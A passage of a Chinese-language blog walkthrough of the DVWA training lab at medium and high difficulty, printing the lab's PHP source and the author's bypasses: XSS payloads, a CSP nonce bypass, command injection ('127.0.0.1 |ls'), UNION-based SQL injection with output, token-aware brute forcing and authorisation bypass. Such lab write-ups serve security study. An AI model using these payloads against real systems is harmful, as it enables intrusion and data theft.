class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现只过滤了script标签，那就直接img标签过了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>把script标签置空，那就双写绕过过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>或者大小写绕过也行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>（1）message处使用了htmlspecialchars()函数，将字符全部转为了HTML实体，因此message处无法使用XSS形成攻击。</p>
+<p>（2）name处做了长度限制，因此考虑使用抓包在BP中修改name的值（还是直接在浏览器改更快，还有就是他会将 <code>&lt;script&gt; </code>转化为空，所有考虑使用双写或者大小写去绕过。</p>
+<p>其他不多说。</p>
+<h4 id="7content-security-policy-csp-bypass"><a class="markdownIt-Anchor" href="#7content-security-policy-csp-bypass"></a> 7）Content Security Policy (CSP) Bypass</h4>
+<p><strong>Content Security Policy (CSP) Bypass</strong>，指的是攻击者利用CSP策略本身的配置缺陷或浏览器的机制漏洞，成功让网页加载并执行了本应被CSP禁止的恶意代码（比如JavaScript）。简单来说，就是找到了突破网站“白名单”安全屏障的方法。</p>
+<p>CSP的核心是让开发者通过 <code>Content-Security-Policy</code> 响应头来告诉浏览器，哪些资源是合法的。一个CSP Bypass的成立，通常是攻击者抓住了策略中“允许的”部分并加以滥用。</p>
+<p>因此，low难度只要把Content-Security-Policy里的url粘贴上去就行了</p>
+<p>medium难度：</p>
+<p>没有做任何过滤</p>
+<p>请求头里包含了 nonce。nonce 后加一个 base64 编码后的字符串。添加这一限制后，所有 script 都必须带上相同的 nonce，否则浏览器就拒绝执行。</p>
+<p>然而，这一等级中 nonce 并不是每次随机生成的，而是一个固定的字符串 。base64 解码之后内容是：「Never going to give you up」……</p>
+<p>只要提交这样的一段 script 即可：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="8javascript-attacks"><a class="markdownIt-Anchor" href="#8javascript-attacks"></a> 8）JavaScript Attacks</h4>
+<p>low难度弄出success的MD5值抓包改token即可</p>
+<p>medium更简单，只需要抓包把全部ChangeMe改为success即可</p>
+<h4 id="9authorisation-bypass"><a class="markdownIt-Anchor" href="#9authorisation-bypass"></a> 9）Authorisation Bypass</h4>
+<p>low没有防护直接修改即可</p>
+<p>进去以后发现没有这一关，于是直接通过url访问/vulnerabilities/authbypass/即可</p>
+<p>medium难度：</p>
+<p>low不能成功，看看源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only the admin user is allowed to access this page.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Have a look at these two files for possible vulnerabilities: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* vulnerabilities/authbypass/get_user_data.php</span></span><br><span class="line"><span class="comment">* vulnerabilities/authbypass/change_user_details.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">dvwaCurrentUser</span>() != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Unauthorised&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现可以通过这个改：vulnerabilities/authbypass/change_user_details.php</p>
+<h4 id="10open-http-redirect"><a class="markdownIt-Anchor" href="#10open-http-redirect"></a> 10）Open HTTP Redirect</h4>
+<p>low直接抓包修改即可，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vulnerabilities/open_redirect/source/low.php?redirect=https://ys.mihoyo.com/cloud/#/</span><br></pre></td></tr></table></figure>
+<p>Medium：不能含有协议名</p>
+<p>判断目标 URL 中是否包含 <code>http://</code> 或者 <code>https://</code>，如果包含则拒绝重定向。</p>
+<p>表示 URL 时，如果没有明确指定协议，直接以 <code>//</code> 开头，则表示使用和当前页面相同的协议。现在绝大部分网站又都支持将 HTTP 重定向到 HTTPS，所以和low没什么区别。</p>
+<h3 id="3high"><a class="markdownIt-Anchor" href="#3high"></a> 3.high</h3>
+<h4 id="1brute-force-2"><a class="markdownIt-Anchor" href="#1brute-force-2"></a> 1）Brute Force</h4>
+<p>为了减少工作量我假设账号为admin)Doge</p>
+<p>和 medium 的区别在于：</p>
+<ul>
+<li>
+<p>如果密码错误，等待随机 0～3 秒才返回。</p>
+</li>
+<li>
+<p>表单中增加了隐藏的 input 组件 <code>user_token</code>，值为每次随机的字符串，用于防止 CSRF 攻击。</p>
+<p>因此我们使用Grep - Extract功能提取 token，用 Pitchfork 模式尝试。</p>
+<p>至于为什么不用集束炸弹，很简单，</p>
+<p><code>token</code>机制的核心是**“一次一密”<strong>。我们发送的每一个登录请求，都必须携带一个</strong>从上一个请求响应中获取的、全新的、有效的<code>token</code>**。</p>
+<p>而对于集束炸弹来说：</p>
+<ul>
+<li>它会尝试所有组合：<code>密码1</code>+<code>token_A</code>，<code>密码1</code>+<code>token_B</code>，<code>密码1</code>+<code>token_C</code>……</li>
+<li>但问题是，<strong>除了<code>token_A</code>，其它的<code>token_B</code>、<code>token_C</code>都是无效或已过期的</strong>。因为它们不是在正确的时序下生成的。</li>
+<li>结果就是，<strong>除了第一个请求，其余所有请求都会因为<code>token</code>无效而直接失败</strong>，永远无法得到正确的登录结果。</li>
+</ul>
+</li>
+</ul>
+<p>第一个参数不多说，和之前一样</p>
+<p><img src="https://s41.ax1x.com/2026/08/07/pm7BKTs.png" alt="image" /></p>
+<p>设置第二个参数——token，有效载荷类型改为递归搜索</p>
+<p>记得改为单线程模式，不然就会报错</p>
+<p>然后爆破成功得到密码（这个test是我自己设置的，如果没设置就是password，侧面反映出爆破的成功doge）</p>
+<p><img src="https://raw.githubusercontent.com/Cl1ck-t0/image-bed/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-08-07%20102300.png" alt="img" /></p>
+<h4 id="2command-injection-2"><a class="markdownIt-Anchor" href="#2command-injection-2"></a> 2）Command Injection</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line">   <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   ); </span><br></pre></td></tr></table></figure>
+<p>看似过滤了很多，实则这里给我玩阴的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;| &#x27; =&gt; &#x27;&#x27;,  仔细看发现管道符后面还有空格，那就把空格去掉依旧行得通</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 |ls</span><br></pre></td></tr></table></figure>
+<h4 id="3csrf-2"><a class="markdownIt-Anchor" href="#3csrf-2"></a> 3）CSRF</h4>
+<p>看了源码</p>
+<p>high等级的主要区别是增加了一个token值的校验，每次登录都会校验token是否正确，若想要执行更改密码操作必须知道正常用户的token</p>
+<p>实则不知道为什么直接改就行？hyw</p>
+<h4 id="4xss_drs"><a class="markdownIt-Anchor" href="#4xss_drs"></a> 4）xss_d&amp;r&amp;s</h4>
+<p>xss_d:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个后端代码可以说是没什么问题了，获取到语言以后直接break，不然就重定向，几乎没什么漏洞，于是我们只能从前端找问题；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接截取url中default后面的值，</p>
+<p>因此：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">English&amp;%3Cscript%3Ealert()%3C/script%3E</span><br></pre></td></tr></table></figure>
+<p>xss_r:</p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>正则替换，但是没什么用doge</p>
+<p>payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>xss_s：</p>
+<p>依旧：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>ps：high难度还是太逊了，比不了学长出的“我要不停的实践你…rev”一点doge😭</p>
+<h4 id="5sql"><a class="markdownIt-Anchor" href="#5sql"></a> 5）SQL</h4>
+<p>high难度添加了单独的页面强强强</p>
+<p>上去测试了一下结果写个1’被记录导致整个SQL挑战炸了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dvwa/vulnerabilities/sqli/session-input.php</span><br></pre></td></tr></table></figure>
+<p>访问写个正常的就可以了emmmmmm</p>
+<p>说明页面存在SQL注入漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database()#   </span><br></pre></td></tr></table></figure>
+<p>这里–+里的+不会被解析成空格，所以只能用# 或者-- 其他语句用空格隔开，不然会报错</p>
+<p>爆出库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: -1&#x27; union select 1,database()#   </span><br><span class="line">First name: 1</span><br><span class="line">Surname: dvwa</span><br></pre></td></tr></table></figure>
+<p>爆表：怎么一点过滤没有好不习惯emmmmmm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: -1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br></pre></td></tr></table></figure>
+<p>爆字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: -1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: avatar,failed_login,first_name,last_login,last_name,password,user,user_id,CURRENT_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY,TOTAL_CONNECTIONS,USER</span><br></pre></td></tr></table></figure>
+<p>后面没什么好说的了。</p>
+<h4 id="6content-security-policy-csp-bypass"><a class="markdownIt-Anchor" href="#6content-security-policy-csp-bypass"></a> 6）Content Security Policy (CSP) Bypass</h4>
+<p>源码中：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>是通过这里调用的，控制台改一下就就行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=alert&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="7authorisation-bypass"><a class="markdownIt-Anchor" href="#7authorisation-bypass"></a> 7）Authorisation Bypass</h4>
+<p>vulnerabilities/authbypass/change_user_details.php依旧能用，只是get_user_data.php做了鉴权，和medium差不多</p>
+<p>其他还没做😋后续做完再补充</p>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/31/DVWA-security/">https://cl1ck-t0.github.io/2026/07/31/DVWA-security/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-31 12:41:35</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-08-07 12:07:28</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F07%2F31%2FDVWA-security%2F&amp;appkey=&amp;title=DVWA%20security&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="DVWA security">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=DVWA%20security&amp;desc=DVWA%20security&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="DVWA security">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="DVWA security">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/149717205_p0_master1200.jpg" data-sizes="auto" alt="CSP" class="lazyload">
+        <a href="/2026/08/15/CSP/" aria-label="Prev: CSP" title="Prev: CSP"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            CSP
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/a313a5b13f55b09555bfaa524b212f13.jpg" data-sizes="auto" alt="ctfshow-crypto-wp" class="lazyload">
